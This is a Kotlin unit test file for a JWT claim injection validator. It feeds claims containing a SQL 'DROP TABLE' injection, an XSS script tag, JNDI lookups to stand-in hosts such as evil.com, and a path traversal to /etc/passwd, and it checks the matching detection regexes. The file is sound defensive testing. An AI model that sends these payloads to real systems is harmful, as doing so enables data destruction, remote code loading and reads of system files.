package com.axians.eaf.framework.security.validation

import com.axians.eaf.framework.security.InjectionDetectedException
import com.axians.eaf.framework.security.InjectionDetector
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain
import org.springframework.security.oauth2.core.OAuth2TokenValidatorResult
import org.springframework.security.oauth2.jwt.Jwt
import java.time.Instant

/**
 * Unit tests for JwtInjectionValidator (Layer 10: Injection Detection).
 *
 * Tests validate that JWT claims are scanned for malicious injection patterns
 * including SQL injection, XSS, JNDI injection, Expression Injection, and
 * Path Traversal attacks. Uses InjectionDetector for comprehensive pattern matching.
 *
 * Story 3.8: User Validation and Injection Detection (Layers 9-10)
 */
class JwtInjectionValidatorTest :
    FunSpec({
        val injectionDetector = InjectionDetector()
        val validator = JwtInjectionValidator(injectionDetector)

        test("valid JWT with safe claims should pass validation") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "name" to "John Doe",
                            "email" to "john.doe@example.com",
                            "tenant_id" to "tenant-a",
                            "roles" to listOf("WIDGET_ADMIN"),
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe false
        }

        test("JWT with SQL injection in sub claim should fail validation") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user'; DROP TABLE users; --",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe true
            result.errors.first().errorCode shouldBe "invalid_request"
            result.errors.first().description shouldBe
                "JWT claim contains potential injection pattern: Potential injection detected in claim 'sub': " +
                "pattern=(?i).*((--)|(;)|(\\*)|(< )|(>)|(\\|)|(\\^)).*"
        }

        test("JWT with XSS injection in name claim should fail validation") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "name" to "<script>alert('xss')</script>",
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe true
            result.errors.first().errorCode shouldBe "invalid_request"
            result.errors.first().description shouldContain "JWT claim contains potential injection pattern"
        }

        test("JWT with JNDI injection in email claim should fail validation") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "email" to "user@ldap://malicious.com",
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe true
            result.errors.first().errorCode shouldBe "invalid_request"
            result.errors.first().description shouldBe
                "JWT claim contains potential injection pattern: Potential injection detected in claim 'email': " +
                "pattern=(?i).*(jndi:|ldap:|rmi:).*"
        }

        test("JWT with Expression Injection in custom claim should fail validation") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "custom_data" to "\${jndi:ldap://evil.com}",
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe true
            result.errors.first().errorCode shouldBe "invalid_request"
            result.errors.first().description shouldContain "JWT claim contains potential injection pattern"
        }

        test("JWT with Path Traversal in file_path claim should fail validation") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "file_path" to "../../../etc/passwd",
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe true
            result.errors.first().errorCode shouldBe "invalid_request"
            result.errors.first().description shouldBe
                "JWT claim contains potential injection pattern: Potential injection detected in claim 'file_path': " +
                "pattern=(?i).*(\\.\\.[\\\\/]).*"
        }

        test("JWT with multiple injection patterns should fail on first detected pattern") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "name" to "<script>alert('xss')</script>",
                            "email" to "user@ldap://malicious.com",
                            // This would be second pattern, but should not reach here
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe true
            // Should fail on the first detected pattern (name claim matches SQL pattern due to ">")
            result.errors
                .first()
                .description
                .contains("name") shouldBe true
            result.errors
                .first()
                .description
                .contains(">") shouldBe true
        }

        test("JWT with non-string claims should be ignored by injection detection") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "roles" to listOf("ADMIN", "USER"), // List, not String
                            "permissions" to mapOf("read" to true, "write" to false), // Map, not String
                            "count" to 42, // Number, not String
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe false
        }

        test("JWT with safe special characters should pass validation") {
            val jwt =
                createJwt(
                    claims =
                        mapOf(
                            "sub" to "user-123",
                            "iss" to "https://keycloak.example.com/realms/eaf",
                            "aud" to "eaf-api",
                            "exp" to Instant.now().plusSeconds(3600),
                            "iat" to Instant.now(),
                            "name" to "O'Connor-Smith", // Safe apostrophe
                            "email" to "user+tag@example.com", // Safe plus sign
                            "description" to "Item #1: 100% complete", // Safe percent, hash, colon
                        ),
                )

            val result = validator.validate(jwt)

            result.hasErrors() shouldBe false
        }
    })

/**
 * Helper function to create a test JWT with specified claims.
 */
private fun createJwt(claims: Map<String, Any>): Jwt {
    val headers = mapOf("alg" to "RS256", "typ" to "JWT")
    val tokenValue = "mock-token-value"

    return Jwt
        .withTokenValue(tokenValue)
        .headers { h -> h.putAll(headers) }
        .claims { c -> c.putAll(claims) }
        .build()
}
